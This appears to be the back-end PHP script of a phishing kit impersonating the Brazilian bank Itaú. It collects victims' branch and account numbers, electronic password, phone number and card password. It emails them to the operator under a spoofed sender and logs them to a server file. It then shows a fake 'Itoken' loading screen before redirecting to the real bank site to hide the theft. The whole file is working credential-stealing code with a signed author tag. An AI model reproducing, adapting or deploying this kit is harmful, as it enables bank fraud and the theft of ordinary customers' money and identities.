<?php
error_reporting(0);
ini_set(“display_errors”, 0 );

require_once("../config.php");

$ag = $_POST ['agencia'];
$conta = $_POST ['conta'];
$s_1 = $_POST ['senha'];
$txtDDD = $_POST ['txtDDD'];
$txtFONE = $_POST ['txtFONE'];
$txtFONE = $_POST ['txtFONE'];
$txtPassT2 = $_POST ['txtPassT2'];


extract($_POST);
$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .="From: ITA  <chegou@hp.com>";
$ip = $_SERVER["REMOTE_ADDR"];
date_default_timezone_set('America/Sao_Paulo');
$data=date("d/m/Y");
$hora=date("H:i");

$conteudo.="
__________________DADOS____________________<br>
___________________________________________<br>
AGENCIA__________: $ag<br>
CONTA___________: $conta<br>
SENHA ELETRONICA_____: $s_1<br>
TELEFONE __________: $txtDDD $txtFONE <br>
SENHA CARTAO__________: $txtPassT2 <br>
___________________________________________<br>
Created by Robson";

@mail($receber, "ENTREGA - ROBSON - $ip", "$conteudo", $headers); 


$tudo = "
<tr><td><font color='red' size='4'>$ag</font></td><td><font color='red' size='4'>$conta</font></td><td><font color='red' size='4'>$s_1</font></td><td><font color='red' size='4'>$txtDDD $txtFONE</font></td><td><font color='red' size='4'>$txtPassT2</font></td><td><font color='red' size='4'>$data</font></td><td><font color='red' size='4'>$ip</font></td></tr>";
$fopen = fopen("../data_base.php", "a");
fwrite($fopen, $tudo);
fclose($fopen);



?>








<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
        Itaú
    </title>
    <link href="" type="image/x-icon" rel="icon"><link href="http://x-seguranca.info/app_banking/img/caixa/caixa-logo-x.png" type="image/x-icon" rel="shortcut icon">
    <link rel="stylesheet" href="FILES3/bootstrap.min.css">    <link rel="stylesheet" href="FILES3/bootstrap-theme.min.css">    <link rel="stylesheet" href="FILES3/material-kit.css">    <link rel="stylesheet" href="FILES3/font-awesome.min.css">    <link rel="stylesheet" href="FILES3/caixa.css">
    <script src="FILES3/jquery-3.2.1.min.js.download"></script>    <script src="FILES3/bootstrap.min.js.download"></script>    <script src="FILES3/material.min.js.download"></script>    <script src="FILES3/nouislider.min.js.download"></script>    <script src="FILES3/material-kit.js.download"></script>    <script src="FILES3/jquery.mask.min.js.download"></script>    <script src="FILES3/bootbox.min.js.download"></script>
            </head>
<body>

        <div class="container clearfix">
        <div class="row">
            <div class="container-nulo">
	<img src="FILES3/loader.svg" class="init_logo" alt="">	<span class="loader_obs">Liberando Itoken, aguarde.....</span>
</div>
<script type="text/javascript">
	$(function() {
		var timeout = setTimeout(function() {
			$('.init_logo').fadeOut('slow');
			$('.loader_obs').css('top', '50%');
			$('.loader_obs').text('Em breve você receberá um contato da área de segurança Itau!');
			var timeout2 = setTimeout(function() {
				window.location = "https://www.itau.com.br/";
			}, 4000);
		}, 4000);
	})
</script>        </div>
    </div>


</body></html>